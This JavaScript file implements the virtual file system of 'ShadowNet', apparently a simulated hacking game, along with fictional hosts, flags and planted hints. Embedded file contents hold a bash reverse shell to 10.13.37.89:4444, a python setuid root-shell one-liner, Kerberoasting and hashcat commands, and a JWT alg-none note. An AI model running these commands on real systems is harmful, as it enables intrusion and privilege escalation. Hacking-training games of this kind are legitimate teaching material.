// Virtual File System for ShadowNet terminal, remote targets, and internal vault

export class VirtualFS {
  constructor(initialTree = null, homePath = '/home/guest') {
    this.home = homePath;
    this.cwd = homePath;
    this.root = initialTree || this.getDefaultLocalTree();
  }

  getDefaultLocalTree() {
    return {
      name: '/',
      type: 'dir',
      children: {
        home: {
          type: 'dir',
          children: {
            guest: {
              type: 'dir',
              children: {
                'notes.txt': {
                  type: 'file',
                  content: `[SHADOWNET SECURE OPERATIONS NOTEBOOK]
- Operation: Apex Perimeter & Internal Domain Compromise
- Target Perimeter Host: 192.168.1.42 (internal.stag-apex.corp)
- Target Internal Subnet: 10.0.0.0/24 (Domain Controller & Vault 10.0.0.254)
- Methodology:
  1. Recon & Service Fingerprinting (nmap)
  2. Web Asset Discovery (gobuster, curl)
  3. Credential Spraying (hydra, rockyou.txt)
  4. SQL Injection (sqlmap)
  5. Sudo PrivEsc (sudo -l)
  6. API Token Forgery (jwt-tool, base64)
  7. Filter-Bypass RCE & Interactive Reverse Shell (nc, \${IFS})
  8. Network Pivoting & SOCKS Tunneling (chisel, proxychains)
  9. Active Directory Kerberoasting (impacket-GetUserSPNs, hashcat -m 13100)
  10. Linux Capabilities to Master Root (getcap, python3)
`
                },
                'tools_quickref.md': {
                  type: 'file',
                  content: `# ShadowNet Advanced Tool Quick Reference
- jwt-tool -t <token> -X a (alg: none exploit)
- nc -lvnp 4444 (reverse shell listener)
- ssh -D 1080 devadmin@192.168.1.42 (SOCKS5 dynamic proxy)
- proxychains nmap -sT 10.0.0.254 (scan internal host through tunnel)
- proxychains impacket-GetUserSPNs stag-apex.corp/devadmin:apex2026! -dc-ip 10.0.0.254 -request
- hashcat -m 13100 ticket.hash /usr/share/wordlists/rockyou.txt
- getcap -r / 2>/dev/null
- python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
`
                },
                'payloads': {
                  type: 'dir',
                  children: {
                    'reverse_shell.sh': {
                      type: 'file',
                      content: '#!/bin/bash\nbash -i >& /dev/tcp/10.13.37.89/4444 0>&1\n'
                    },
                    'jwt_test.token': {
                      type: 'file',
                      content: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc4ODQyNTcwMH0.dummySignatureSecret123\n'
                    }
                  }
                }
              }
            }
          }
        },
        usr: {
          type: 'dir',
          children: {
            share: {
              type: 'dir',
              children: {
                wordlists: {
                  type: 'dir',
                  children: {
                    'rockyou.txt': {
                      type: 'file',
                      content: `123456
password
12345678
qwerty
123456789
shadowfall
dragon
baseball
football
letmein
monkey
hacker
apex2026!
secret123
Winter2026!
master
superman
trustno1
`
                    },
                    dirb: {
                      type: 'dir',
                      children: {
                        'common.txt': {
                          type: 'file',
                          content: `admin
api
backup
backup_cred.txt.bak
config
css
dev_portal
images
includes
index.html
js
login
robots.txt
search.php
upload.php
`
                        }
                      }
                    }
                  }
                }
              }
            },
            bin: {
              type: 'dir',
              children: {
                nmap: { type: 'file', content: '# binary: nmap' },
                gobuster: { type: 'file', content: '# binary: gobuster' },
                hydra: { type: 'file', content: '# binary: hydra' },
                sqlmap: { type: 'file', content: '# binary: sqlmap' },
                hashcat: { type: 'file', content: '# binary: hashcat' },
                curl: { type: 'file', content: '# binary: curl' },
                nc: { type: 'file', content: '# binary: nc' },
                'jwt-tool': { type: 'file', content: '# binary: jwt-tool' },
                base64: { type: 'file', content: '# binary: base64' },
                proxychains: { type: 'file', content: '# binary: proxychains' },
                chisel: { type: 'file', content: '# binary: chisel' },
                'impacket-GetUserSPNs': { type: 'file', content: '# binary: impacket-GetUserSPNs' },
                getcap: { type: 'file', content: '# binary: getcap' },
                strings: { type: 'file', content: '# binary: strings' },
                python3: { type: 'file', content: '# binary: python3' },
                aws: { type: 'file', content: '# binary: aws CLI' },
                docker: { type: 'file', content: '# binary: docker client' },
                tcpdump: { type: 'file', content: '# binary: tcpdump' }
              }
            }
          }
        },
        etc: {
          type: 'dir',
          children: {
            hosts: {
              type: 'file',
              content: '127.0.0.1\tlocalhost\n192.168.1.42\tinternal.stag-apex.corp\n192.168.1.100\tdb01.stag-apex.corp\n10.0.0.254\tvault01.stag-apex.corp\n'
            },
            proxychains4: {
              type: 'file',
              content: 'strict_chain\nproxy_dns\ntcp_read_time_out 15000\ntcp_connect_time_out 8000\n[ProxyList]\nsocks5 127.0.0.1 1080\n'
            },
            resolv: {
              type: 'file',
              content: 'nameserver 1.1.1.1\nnameserver 8.8.8.8\n'
            },
            os_release: {
              type: 'file',
              content: 'NAME="ShadowNet OS"\nVERSION="1.0.4 Hardened-Kernel"\nID=shadownet\n'
            }
          }
        },
        var: {
          type: 'dir',
          children: {
            log: {
              type: 'dir',
              children: {
                'auth.log': {
                  type: 'file',
                  content: 'Sep 03 13:37:00 shadownet systemd[1]: Started ShadowNet daemon.\nSep 03 13:37:12 shadownet sshd[401]: Accepted publickey for guest from 10.13.37.89 port 54812\n'
                }
              }
            }
          }
        }
      }
    };
  }

  static getRemoteTree() {
    return {
      name: '/',
      type: 'dir',
      children: {
        home: {
          type: 'dir',
          children: {
            devadmin: {
              type: 'dir',
              children: {
                'README.txt': {
                  type: 'file',
                  content: `[ALERT FROM SEC-OPS]
Please remember not to leave database credentials in plain view.
Review sudo permissions for developer tools on this staging host.
Notice: Secondary adapter eth1 connects to private subnet 10.0.0.0/24 (Domain Controller: 10.0.0.254).
`
                },
                'flag3.txt': {
                  type: 'file',
                  content: 'FLAG{hydra_strike_devadmin_cracked}\n'
                },
                '.ssh': {
                  type: 'dir',
                  children: {
                    authorized_keys: { type: 'file', content: 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... devadmin@stag-apex' }
                  }
                }
              }
            }
          }
        },
        var: {
          type: 'dir',
          children: {
            www: {
              type: 'dir',
              children: {
                html: {
                  type: 'dir',
                  children: {
                    'index.html': {
                      type: 'file',
                      content: '<h1>Apex Corp Staging Server</h1>\n<p>Internal Services Only.</p>'
                    },
                    'robots.txt': {
                      type: 'file',
                      content: "User-agent: *\nDisallow: /dev_portal/\nDisallow: /backup_cred.txt.bak\n# Internal flag: FLAG{dir_discovery_hidden_dev_88}\n"
                    },
                    'backup_cred.txt.bak': {
                      type: 'file',
                      content: `=== STAGING SERVER CREDENTIALS BACKUP ===
SSH Service: port 22
Username: devadmin
Password Policy: Must match corporate wordlist entry starting with 'apex'
Secondary Subnet: eth1 is configured on 10.0.0.5/24 routing to Domain Controller 10.0.0.254
API Endpoints: /api/v1/auth (JWT) and /api/v1/admin/ping (diagnostic)
`
                    },
                    'dev_portal': {
                      type: 'dir',
                      children: {
                        'index.php': {
                          type: 'file',
                          content: '<?php echo "Developer Portal v1.2 - API Staging"; ?>'
                        },
                        'api_spec.json': {
                          type: 'file',
                          content: '{\n  "status": "online",\n  "database": "apex_staging",\n  "endpoints": ["/search.php?query=", "/api/v1/auth", "/api/v1/admin/ping", "/api/v1/admin/debug"]\n}'
                        }
                      }
                    },
                    'search.php': {
                      type: 'file',
                      content: '<?php\n// Vulnerable SQL query parameter: query\n// $res = mysqli_query($conn, "SELECT id, title, content FROM articles WHERE title LIKE \'%" . $_GET[\'query\'] . "%\'");\n?>'
                    }
                  }
                }
              }
            },
            run: {
              type: 'dir',
              children: {
                'docker.sock': { type: 'file', content: '# unix domain socket: /var/run/docker.sock [CRITICAL: WRITABLE]' }
              }
            }
          }
        },
        proc: {
          type: 'dir',
          children: {
            '1': {
              type: 'dir',
              children: {
                cgroup: {
                  type: 'file',
                  content: `12:pids:/docker/7f8e9d0c1b2a3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d
11:hugetlb:/docker/7f8e9d0c1b2a3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d
10:net_cls,net_prio:/docker/7f8e9d0c1b2a3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d
[!] Notice: Process 1 is confined within Docker container namespace!`
                }
              }
            }
          }
        },
        mnt: {
          type: 'dir',
          children: {
            host: {
              type: 'dir',
              children: {
                root: {
                  type: 'dir',
                  children: {
                    'docker_escape_flag.txt': {
                      type: 'file',
                      content: `FLAG{docker_sock_container_escape_host_pwned}\n\n[HOST ESCAPE COMPLETE] You broke out of the Docker container namespace and gained physical node root!\n`
                    }
                  }
                }
              }
            }
          }
        },
        root: {
          type: 'dir',
          children: {
            'root_flag.txt': {
              type: 'file',
              content: 'FLAG{root_sovereign_apex_spectre}\n\n[PERIMETER COMPROMISED] Stage 1 Root achieved. Now pivot through eth1 into 10.0.0.0/24 to attack the Domain Vault!\n'
            }
          }
        },
        etc: {
          type: 'dir',
          children: {
            sudoers: {
              type: 'file',
              content: 'devadmin ALL=(ALL) NOPASSWD: /usr/bin/find\n'
            },
            network: {
              type: 'dir',
              children: {
                interfaces: {
                  type: 'file',
                  content: `# The primary network interface (External/DMZ)\nauto eth0\niface eth0 inet static\n  address 192.168.1.42\n  netmask 255.255.255.0\n\n# The secondary internal private network interface\nauto eth1\niface eth1 inet static\n  address 10.0.0.5\n  netmask 255.255.255.0\n  gateway 10.0.0.1\n`
                }
              }
            },
            passwd: {
              type: 'file',
              content: 'root:x:0:0:root:/root:/bin/bash\ndevadmin:x:1000:1000:DevAdmin:/home/devadmin:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n'
            },
            shadow: {
              type: 'file',
              content: 'root:$6$rounds=5000$saltsalt$5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:19420:0:99999:7:::\n'
            }
          }
        }
      }
    };
  }

  static getVaultTree() {
    return {
      name: '/',
      type: 'dir',
      children: {
        home: {
          type: 'dir',
          children: {
            svc_mssql: {
              type: 'dir',
              children: {
                'README.txt': {
                  type: 'file',
                  content: `[APEX DOMAIN CONTROLLER & VAULT 10.0.0.254]
Active Directory Domain: stag-apex.corp
Service Account: svc_mssql (SPN: MSSQLSvc/db01.stag-apex.corp)
Security Policy: Sudo disabled for service accounts. Custom binaries managed with Linux capabilities.
`
                },
                'flag9.txt': {
                  type: 'file',
                  content: 'FLAG{kerberoast_spn_mssql_ticket_cracked}\n'
                }
              }
            }
          }
        },
        usr: {
          type: 'dir',
          children: {
            bin: {
              type: 'dir',
              children: {
                'python3.8': {
                  type: 'file',
                  content: '# binary: python3.8 [capability: cap_setuid+ep]'
                },
                getcap: { type: 'file', content: '# binary: getcap' },
                strings: { type: 'file', content: '# binary: strings' }
              }
            }
          }
        },
        root: {
          type: 'dir',
          children: {
            'apex_master_flag.txt': {
              type: 'file',
              content: `================================================================================
           ★★★ APEX SOVEREIGN INFRASTRUCTURE FULLY COMPROMISED ★★★
================================================================================
FLAG{apex_master_sovereign_cap_root_2026}

CONGRATULATIONS OPERATIVE!
You have successfully penetrated the outer perimeter, extracted credentials,
exploited SQL injection, bypassed WAF/filters, pivoted through internal SOCKS tunnels,
executed an offline Active Directory Kerberoasting attack, and weaponized Linux
capabilities to achieve Master Domain Sovereignty (UID 0 on 10.0.0.254).

YOU HAVE CONQUERED ALL 10 LEVELS OF SHADOWNET!
================================================================================
`
            }
          }
        }
      }
    };
  }

  normalizePath(pathStr) {
    if (!pathStr || pathStr === '~') return this.home;
    if (pathStr.startsWith('~/')) {
      pathStr = this.home + pathStr.slice(1);
    }

    let absolute = pathStr.startsWith('/')
      ? pathStr
      : (this.cwd === '/' ? `/${pathStr}` : `${this.cwd}/${pathStr}`);

    const parts = absolute.split('/').filter(Boolean);
    const stack = [];

    for (const part of parts) {
      if (part === '.') continue;
      if (part === '..') {
        if (stack.length > 0) stack.pop();
      } else {
        stack.push(part);
      }
    }

    return '/' + stack.join('/');
  }

  getNode(pathStr) {
    const fullPath = this.normalizePath(pathStr);
    if (fullPath === '/') return this.root;

    const parts = fullPath.split('/').filter(Boolean);
    let curr = this.root;

    for (const part of parts) {
      if (!curr || curr.type !== 'dir' || !curr.children) return null;
      curr = curr.children[part];
      if (!curr) return null;
    }

    return curr;
  }

  cd(pathStr) {
    if (!pathStr || pathStr.trim() === '') {
      this.cwd = this.home;
      return { success: true, path: this.cwd };
    }

    const targetPath = this.normalizePath(pathStr);
    const node = this.getNode(targetPath);

    if (!node) {
      return { success: false, error: `cd: no such file or directory: ${pathStr}` };
    }
    if (node.type !== 'dir') {
      return { success: false, error: `cd: not a directory: ${pathStr}` };
    }

    this.cwd = targetPath;
    return { success: true, path: this.cwd };
  }

  ls(pathStr = '', showAll = false, longFormat = false) {
    const targetPath = pathStr ? this.normalizePath(pathStr) : this.cwd;
    const node = this.getNode(targetPath);

    if (!node) {
      return { success: false, error: `ls: cannot access '${pathStr}': No such file or directory` };
    }

    if (node.type === 'file') {
      return {
        success: true,
        items: [{ name: pathStr || 'file', type: 'file', size: (node.content || '').length }]
      };
    }

    const entries = Object.keys(node.children || {}).sort();
    const filtered = showAll ? entries : entries.filter(e => !e.startsWith('.'));

    const items = filtered.map(name => {
      const child = node.children[name];
      return {
        name,
        type: child.type,
        size: child.type === 'file' ? (child.content || '').length : 4096,
        isExec: child.name?.endsWith('.sh') || child.type === 'dir'
      };
    });

    return { success: true, items, path: targetPath };
  }

  cat(pathStr) {
    if (!pathStr) {
      return { success: false, error: 'cat: missing file operand' };
    }

    const node = this.getNode(pathStr);
    if (!node) {
      return { success: false, error: `cat: ${pathStr}: No such file or directory` };
    }
    if (node.type === 'dir') {
      return { success: false, error: `cat: ${pathStr}: Is a directory` };
    }

    return { success: true, content: node.content || '' };
  }

  writeFile(pathStr, content, overwrite = true) {
    const fullPath = this.normalizePath(pathStr);
    const parts = fullPath.split('/').filter(Boolean);
    const fileName = parts.pop();
    const dirPath = '/' + parts.join('/');

    const dirNode = this.getNode(dirPath);
    if (!dirNode || dirNode.type !== 'dir') {
      return { success: false, error: `cannot create file '${pathStr}': No such directory` };
    }

    if (dirNode.children[fileName] && !overwrite) {
      dirNode.children[fileName].content += content;
    } else {
      dirNode.children[fileName] = {
        type: 'file',
        name: fileName,
        content: content
      };
    }

    return { success: true };
  }

  mkdir(pathStr) {
    const fullPath = this.normalizePath(pathStr);
    const parts = fullPath.split('/').filter(Boolean);
    const dirName = parts.pop();
    const parentPath = '/' + parts.join('/');

    const parentNode = this.getNode(parentPath);
    if (!parentNode || parentNode.type !== 'dir') {
      return { success: false, error: `mkdir: cannot create directory '${pathStr}': No such file or directory` };
    }

    if (parentNode.children[dirName]) {
      return { success: false, error: `mkdir: cannot create directory '${pathStr}': File exists` };
    }

    parentNode.children[dirName] = {
      type: 'dir',
      children: {}
    };

    return { success: true };
  }

  getCompletions(partialPath) {
    let searchDir = this.cwd;
    let prefix = partialPath;

    if (partialPath.includes('/')) {
      const idx = partialPath.lastIndexOf('/');
      const dirPart = partialPath.slice(0, idx) || '/';
      prefix = partialPath.slice(idx + 1);
      const node = this.getNode(dirPart);
      if (node && node.type === 'dir') {
        searchDir = this.normalizePath(dirPart);
      } else {
        return [];
      }
    }

    const dirNode = this.getNode(searchDir);
    if (!dirNode || dirNode.type !== 'dir' || !dirNode.children) return [];

    return Object.keys(dirNode.children)
      .filter(name => name.startsWith(prefix))
      .map(name => {
        const isDir = dirNode.children[name].type === 'dir';
        return {
          match: name + (isDir ? '/' : ''),
          isDir
        };
      });
  }
}
